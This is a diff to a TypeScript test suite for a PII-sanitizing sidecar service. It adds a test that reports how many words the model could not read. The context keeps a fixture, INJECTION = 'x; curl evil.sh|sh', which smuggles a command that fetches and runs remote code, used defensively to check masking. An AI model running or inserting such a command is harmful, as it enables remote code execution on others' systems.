@@ -36,6 +36,8 @@ const INJECTION = 'x; curl evil.sh|sh';
 /** Safe in quotes and in a heredoc body, not unquoted. */
 const FULL_NAME = 'Ada Lovelace';
 const PLACEHOLDER = /\{\{PII_[A-Z_]+_\d+_[0-9a-f]+\}\}/g;
+/** Text the mock engine reports as too long for the model. */
+const UNREADABLE = 'MINIFIEDBLOB';
 
 const PATTERNS: ReadonlyArray<[RegExp, 'private_email' | 'private_person' | 'secret']> = [
   [/john@acme\.io/g, 'private_email'],
@@ -61,7 +63,9 @@ function buildMockNullPii(): { np: NullPii; vault: PiiVault; modelCalls: () => n
         })),
       );
       const r = vault.sanitize(text, spans, id);
-      return { sessionId: id, sanitized: r.sanitized, spans };
+      // A minified blob the model could not read, as the engine reports it.
+      const modelUnscannedWords = text.includes(UNREADABLE) ? 1 : 0;
+      return { sessionId: id, sanitized: r.sanitized, spans, modelUnscannedWords };
     },
     restore: (text: string, sessionId: string) => vault.restore(text, sessionId),
     createSession: () => vault.createSession(),
@@ -688,6 +692,25 @@ describe('sidecar · restore with tool', () => {
 
     expect(res.json()).toMatchObject({ value, replacements: 0, shellKeptMasked: [secret] });
     expect(res.body).not.toContain('evil.sh');
+  });
+});
+
+describe('sidecar · words the model could not read', () => {
+  it('reports how many, without the text', async () => {
+    const { app } = await setup();
+    const opened = await app.inject({
+      method: 'PUT',
+      url: '/v1/sidecar/sessions/s1',
+      headers: AUTH,
+    });
+    const secret = (opened.json() as { secret: string }).secret;
+    const res = await app.inject({
+      method: 'POST',
+      url: '/v1/sidecar/sessions/s1/sanitize',
+      headers: { ...AUTH, [SESSION_SECRET_HEADER]: secret },
+      payload: { value: { a: `owner John ${UNREADABLE}`, b: 'plain' } },
+    });
+    expect(res.json()).toMatchObject({ captured: 1, modelUnscannedWords: 1 });
   });
 });
 
